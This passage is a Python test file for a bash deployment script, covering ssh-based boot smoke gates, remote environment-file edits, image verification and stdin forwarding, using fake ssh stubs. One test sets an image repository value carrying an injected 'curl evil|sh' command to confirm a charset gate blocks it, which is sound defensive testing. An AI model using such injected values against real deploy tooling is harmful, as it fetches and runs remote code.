            # The remote RepoDigests probe must echo the pinned digest back, else
            # do_boot_smoke fails closed on "pulled ref != requested digest".
            case "$*" in
              *"image inspect"*) echo "{smoke_image}" ;;
            esac
            # Gate 1 import smoke must succeed so Gate 2 heredoc is sent.
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)

    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    env["OCIR_NAMESPACE"] = "ns"
    # Real function under test.
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        preflight_ssh() {{ :; }}
        do_boot_smoke dev "{smoke_image}"
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    captured = ssh_log.read_text()
    # Gate 1: import probe with python entrypoint override (packaging only).
    assert "import api.main" in captured
    # Gate 2 heredoc: real image CMD (no sh/uvicorn entrypoint override).
    assert "--entrypoint sh" not in captured
    assert "uvicorn api.main:app" not in captured or "docker run" in captured
    # Mount contract matching compose: blob root + optional models_path :ro.
    assert "RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs" in captured
    assert "/data/cache:ro" in captured
    assert "ACX_MODELS_PATH" in captured
    # Deploy still promotes SHA before env tag after smoke (structural order).
    deploy_script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    deploy_body = deploy_script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
    assert deploy_body.index("do_push_sha") < deploy_body.index("promote_gate") < deploy_body.index(
        "do_push_tag"
    )


def test_d6_ship_remote_image_repo_env_emits_sudo_upsert(
    tmp_path: pathlib.Path,
) -> None:
    """D6 behavioural: ship_remote_image_repo_env ssh payload uses sudo + trailing NL."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    (bindir / "ssh").write_text(
        textwrap.dedent(
            f"""\
            #!/bin/sh
            for a in "$@"; do last="$a"; done
            printf '%s\\n' "$last" >> "{ssh_log}"
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)

    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    safe_repo = "iad.ocir.io/idu2kqqe2jxy/acx-backend-vlm"
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        ACX_IMAGE_REPO={safe_repo!r}
        ship_remote_image_repo_env "/opt/acx-backend/dev"
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    payload = ssh_log.read_text()
    assert "sudo" in payload, payload
    assert "tail -c1" in payload, payload
    assert "tee -a" in payload or "ACX_IMAGE_REPO=" in payload, payload
    assert safe_repo in payload, payload

    # Charset gate is live on the ship path: evil repo must not reach ssh.
    ssh_log.write_text("")
    evil_script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        ACX_IMAGE_REPO='iad.ocir.io/ns/acx; curl evil|sh'
        ship_remote_image_repo_env "/opt/acx-backend/dev"
        """
    )
    evil = subprocess.run(
        ["bash", "-c", evil_script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert evil.returncode != 0, "evil ACX_IMAGE_REPO must fail before ssh"
    assert ssh_log.read_text() == "", f"ssh reached with: {ssh_log.read_text()!r}"


def test_d9_clear_remote_image_repo_env_removes_key(
    tmp_path: pathlib.Path,
) -> None:
    """D9 behavioural: clear_remote_image_repo_env runs sed delete over ssh."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    (bindir / "ssh").write_text(
        textwrap.dedent(
            f"""\
            #!/bin/sh
            for a in "$@"; do last="$a"; done
            printf '%s\\n' "$last" >> "{ssh_log}"
            echo 'removed ACX_IMAGE_REPO'
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)

    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        preflight_ssh() {{ :; }}
        clear_remote_image_repo_env dev
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    payload = ssh_log.read_text()
    assert "ACX_IMAGE_REPO" in payload
    assert "sed" in payload and ("/^ACX_IMAGE_REPO=/d" in payload or "ACX_IMAGE_REPO=" in payload)
    # Subcommand dispatch exists (help / case arm).
    help_proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert help_proc.returncode == 0
    combined = (help_proc.stdout or "") + (help_proc.stderr or "")
    assert "clear-image-repo" in combined


def test_d10_verify_image_mismatch_returns_not_exits(
    tmp_path: pathlib.Path,
) -> None:
    """D10 behavioural: mismatch returns 1; shell stays alive for optional verify."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    # read_running_api_image / read_remote_image_repo both go through ssh.
    # First ssh (read_remote): empty sticky repo; second (read_running): wrong image.
    (bindir / "ssh").write_text(
        textwrap.dedent(
            """\
            #!/bin/sh
            # Heuristic: inspect/Config.Image probe vs .env grep.
            for a in "$@"; do last="$a"; done
            case "$last" in
              *Config.Image*|*compose*ps*)
                echo "iad.ocir.io/ns/acx-backend-vlm:latest"
                ;;
              *ACX_IMAGE_REPO*|*grep*)
                # no sticky remote repo
                ;;
            esac
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)

    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    # Local resolve expects recognition acx-backend; running image is -vlm → mismatch.
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        preflight_ssh() {{ :; }}
        ACX_IMAGE_REPO="iad.ocir.io/ns/acx-backend"
        if verify_running_image_matches_deployed dev; then
          echo MATCH
          exit 0
        else
          rc=$?
          echo "MISMATCH_RC=$rc"
          echo STILL_ALIVE
          exit 0
        fi
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    out = (proc.stdout or "") + (proc.stderr or "")
    assert "STILL_ALIVE" in out, out
    assert "MISMATCH_RC=1" in out, out
    assert re.search(r"(?m)^MATCH$", out) is None, out


def test_dev_fir_env_example_pins_sface_128d_contract() -> None:
    """FIR23-STACK: .env.fir.example is the operator template for acx-dev-fir.

    Shares the :dev image (ACX_IMAGE_TAG=dev) but pins PGVECTOR_DIM=128 and
    face_pipeline models dir so the three-way embedding guard can pass.
    """
    env_fir = (
        REPO_ROOT
        / "apps"
        / "prototype-description-service"
        / ".env.fir.example"
    )
    assert env_fir.is_file(), f"expected {env_fir} to exist"
    text = env_fir.read_text(encoding="utf-8")
    assert "COMPOSE_PROJECT_NAME=acx-dev-fir" in text
    assert "ACX_ENV=dev-fir" in text
    assert "ACX_IMAGE_TAG=dev" in text
    assert "PGVECTOR_DIM=128" in text
    assert "RECOGNITION_FACE_PIPELINE_PROFILE=face_pipeline" in text
    assert (
        "RECOGNITION_FACE_PIPELINE_MODELS_DIR=/data/cache/face_pipeline" in text
    )
    assert "POSTGRES_USER=acx_dev_fir" in text
    assert "POSTGRES_DB=alt_context_dev_fir" in text
    assert "RECOGNITION_AUTH_ENABLED=false" in text
    assert "RECOGNITION_RUNTIME_MODE=production" in text
    # DEV tier: no vault assignment keys (header may mention vault is unused).
    assignments = [
        line.split("#", 1)[0].strip()
        for line in text.splitlines()
        if "=" in line.split("#", 1)[0]
    ]
    assert not any(a.startswith("RECOGNITION_VAULT_SECRET_MAP=") for a in assignments)
    assert not any(
        a.startswith("RECOGNITION_SECRET_BACKEND=") and "oci_vault" in a
        for a in assignments
    )
    assert "RECOGNITION_SECRET_BACKEND=env" in text


def _run_with_deadline_stdin_probe(script_text: str, tmp_path: pathlib.Path) -> subprocess.CompletedProcess:
    """Feed a heredoc through run_with_deadline and capture what the child read."""
    tmp_path.mkdir(parents=True, exist_ok=True)
    script = tmp_path / "recognition-service.sh"
    script.write_text(script_text)
    script.chmod(0o755)
    # The script sources lib/*.sh relative to its own directory.
    shutil.copytree(DEPLOY_SCRIPT.parent / "lib", tmp_path / "lib", dirs_exist_ok=True)
    return subprocess.run(
        [
            "bash",
            "-c",
            f'source "{script}"; run_with_deadline 20 "stdin probe" cat <<\'PAYLOAD\'\n'
            "gate-line-one\ngate-line-two\nPAYLOAD\n",
        ],
        capture_output=True,
        text=True,
        timeout=60,
    )


def test_run_with_deadline_forwards_stdin_to_the_bounded_command(
    tmp_path: pathlib.Path,
) -> None:
    """A bounding wrapper may add a deadline; it may not change what the child reads.

    run_with_deadline backgrounds its child, and a non-interactive shell gives a
    backgrounded job /dev/null on stdin. Before the fd-3 passthrough, every
    heredoc attached to a wrapped call was silently discarded -- including
    do_boot_smoke's SMOKE script piped to `ssh ... bash -s`, where the remote
    shell read EOF, ran zero gates and exited 0. That is a fail-open pre-promote
    gate, so this contract is pinned directly rather than only through D4.
    """
    original = DEPLOY_SCRIPT.read_text()

    good = _run_with_deadline_stdin_probe(original, tmp_path / "good")
    assert good.returncode == 0, good.stderr
    assert "gate-line-one" in good.stdout
    assert "gate-line-two" in good.stdout

    # Mutation control: strip the passthrough and the payload must vanish.
    # Without this the assertions above could pass for the wrong reason.
    mutated = original.replace('exec 3<&0\n  "$@" <&3 &', '"$@" &', 1)
    assert mutated != original, "stdin passthrough anchor not found"
    bad = _run_with_deadline_stdin_probe(mutated, tmp_path / "bad")
    assert "gate-line-one" not in bad.stdout


if __name__ == "__main__":
    raise SystemExit(main())
